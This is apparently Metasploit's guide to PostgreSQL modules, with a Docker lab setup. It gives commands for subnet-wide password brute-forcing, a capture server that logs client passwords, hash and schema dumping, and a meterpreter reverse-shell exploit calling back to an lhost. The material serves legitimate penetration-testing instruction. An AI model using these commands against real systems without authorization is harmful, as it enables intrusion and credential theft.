## PostgreSQL Workflows

PostgreSQL, sometimes aliased as Postgres, is frequently found on port 5432/TCP. It is an open-source relational database management system.

Metasploit has support for multiple PostgreSQL modules, including:

- Version enumeration
- Verifying/bruteforcing credentials
- Dumping database information
- Capture server
- Executing arbitrary SQL queries against the database
- Gaining reverse shells

There are more modules than listed here, for the full list of modules run the `search` command within msfconsole:

```msf
msf6 > search postgres
```

Or to search for modules that work with a specific session type:

```msf
msf6 > search session_type:postgres
```


### Lab Environment

When testing in a lab environment PostgreSQL can either be installed on the host machine or within Docker:

```
docker run -it --rm --publish 127.0.0.1:5432:5432 -e POSTGRES_PASSWORD=password postgres:13.1-alpine
```

### PostgreSQL Enumeration

Enumerate version:

```
use auxiliary/scanner/postgres/postgres_version
run postgres://192.168.123.13
run postgres://postgres:password@192.168.123.13
```

### PostgreSQL Login / Bruteforce

If you have PostgreSQL credentials to validate:

```
use auxiliary/scanner/postgres/postgres_login
run 'postgres://root: a b c p4$$w0rd@127.0.0.1'
```

Re-using PostgreSQL credentials in a subnet:

```
use auxiliary/scanner/postgres/postgres_login
run cidr:/24:myspostgresl://user:pass@192.168.222.0 threads=50
```

Using an alternative port:

```
use auxiliary/scanner/postgres/postgres_login
run postgres://user:pass@192.168.123.6:2222
```

Brute-force host with known user and password list:

```
use auxiliary/scanner/postgres/postgres_login
run postgres://known_user@192.168.222.1 threads=50 pass_file=./wordlist.txt
```

Brute-force credentials:

```
use auxiliary/scanner/postgres/postgres_login
run postgres://192.168.222.1 threads=50 user_file=./users.txt pass_file=./wordlist.txt
```

Brute-force credentials in a subnet:

```
use auxiliary/scanner/postgres/postgres_login
run cidr:/24:postgres://user:pass@192.168.222.0 threads=50
run cidr:/24:postgres://user@192.168.222.0 threads=50 pass_file=./wordlist.txt
```

### Obtaining an Interactive Session
The CreateSession option for `auxiliary/scanner/postgres/postgres_login` allows you to obtain an
interactive session for the Postgres client you're connecting to. The run command with CreateSession
set to true should give you an interactive session.

For example:

```msf
msf6 auxiliary(scanner/postgres/postgres_login) > run rhost=127.0.0.1 rport=5432 username=postgres password=password database=template1 createsession=true
```

Should yield:

```msf
[+] 127.0.0.1:5432 - Login Successful: postgres:password@template1
[*] PostgreSQL session 1 opened (127.0.0.1:61324 -> 127.0.0.1:5432) at 2024-03-15 14:00:12 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

You can interact with your session using `sessions -i -1` or `sessions <session id>`.
Use the help command for more info.

```msf
msf6 auxiliary(scanner/postgres/postgres_login) > sessions

Active sessions
===============

  Id  Name  Type        Information                           Connection
  --  ----  ----        -----------                           ----------
  1         postgresql  PostgreSQL postgres @ 127.0.0.1:5432  127.0.0.1:61324 -> 127.0.0.1:5432 (127.0.0.1)

msf6 auxiliary(scanner/postgres/postgres_login) > sessions -i 1
[*] Starting interaction with 1...
```

When interacting with a session, the help command can be useful:

```msf
postgresql @ 127.0.0.1:5432 (template1) > help

Core Commands
=============

    Command            Description
    -------            -----------
    ?                  Help menu
    background         Backgrounds the current session
    bg                 Alias for background
    exit               Terminate the PostgreSQL session
    help               Help menu
    irb                Open an interactive Ruby shell on the current session
    pry                Open the Pry debugger on the current session
    sessions           Quickly switch to another session


PostgreSQL Client Commands
==========================

    Command            Description
    -------            -----------
    query              Run a single SQL query
    query_interactive  Enter an interactive prompt for running multiple SQL queries


Local File System Commands
==========================

    Command            Description
    -------            -----------
    getlwd             Print local working directory (alias for lpwd)
    lcat               Read the contents of a local file to the screen
    lcd                Change local working directory
    ldir               List local files (alias for lls)
    lls                List local files
    lmkdir             Create new directory on local machine
    lpwd               Print local working directory

This session also works with the following modules:

  auxiliary/admin/postgres/postgres_readfile
  auxiliary/admin/postgres/postgres_sql
  auxiliary/scanner/postgres/postgres_hashdump
  auxiliary/scanner/postgres/postgres_schemadump
  auxiliary/scanner/postgres/postgres_version
  exploit/linux/postgres/postgres_payload
  exploit/multi/postgres/postgres_copy_from_program_cmd_exec
  exploit/multi/postgres/postgres_createlang
  exploit/windows/postgres/postgres_payload
```

Once you've done that, you can run any Postgres query against the target using the `query` command:

```msf
postgresql @ 127.0.0.1:5432 (template1) > query -h
Usage: query

Run a single SQL query on the target.

OPTIONS:

    -h, --help      Help menu.
    -i, --interact  Enter an interactive prompt for running multiple SQL queries

Examples:

    query SELECT user;
    query SELECT version();
    query SELECT * FROM pg_catalog.pg_tables;

postgresql @ 127.0.0.1:5432 (template1) > query 'SELECT version();'
[*] SELECT 1

Response
========

    #  version
    -  -------
    0  PostgreSQL 14.1 on aarch64-apple-darwin20.6.0, compiled by Apple clang version 12.0.5 (clang-1205.0.22.9), 64-bit
```

Alternatively you can enter a SQL prompt via the `query_interactive` command which supports multiline commands:

```msf
postgresql @ 127.0.0.1:5432 (template1) > query_interactive -h
Usage: query_interactive

Go into an interactive SQL shell where SQL queries can be executed.
To exit, type 'exit', 'quit', 'end' or 'stop'.

postgresql @ 127.0.0.1:5432 (template1) > query_interactive
[*] Starting interactive SQL shell for postgresql @ 127.0.0.1:5432 (template1)
[*] SQL commands ending with ; will be executed on the remote server. Use the exit command to exit.

SQL >> SELECT table_name
SQL *>   FROM information_schema.tables
SQL *>  LIMIT 2;
[*] Executing query: SELECT table_name FROM information_schema.tables LIMIT 2;
[*] SELECT 2

Response
========

    #  table_name
    -  ----------
    0  pg_statistic
    1  pg_type

SQL >>
```

### PostgreSQL Capture Server

Captures and log PostgreSQL credentials:

```
use auxiliary/server/capture/postgresql
run
```

For example, if a client connects with:

```
psql postgres://postgres:mysecretpassword@localhost:5432
```

Metasploit's output will be:

```msf
msf6 auxiliary(server/capture/postgresql) >
[*] Started service listener on 0.0.0.0:5432
[*] Server started.
[+] PostgreSQL LOGIN 127.0.0.1:60406 postgres / mysecretpassword / postgres
```

### PostgreSQL Dumping

User and hash dump:

```
use auxiliary/scanner/postgres/postgres_hashdump
run postgres://postgres:password@192.168.123.13
run postgres://postgres:password@192.168.123.13/database_name
```

Schema dump:

```
use auxiliary/scanner/postgres/postgres_schemadump
run postgres://postgres:password@192.168.123.13
run postgres://postgres:password@192.168.123.13 ignored_databases=template1,template0,postgres
```

### PostgreSQL Querying

```
use auxiliary/admin/postgres/postgres_sql
run 'postgres://user:this is my password@192.168.1.123/database_name' sql='select version()'
```

### PostgreSQL Reverse Shell

```
use exploit/linux/postgres/postgres_payload
run postgres://postgres:password@192.168.123.6 lhost=192.168.123.1 lport=5000 payload=linux/x64/meterpreter/reverse_tcp target='Linux\ x86_64'
```
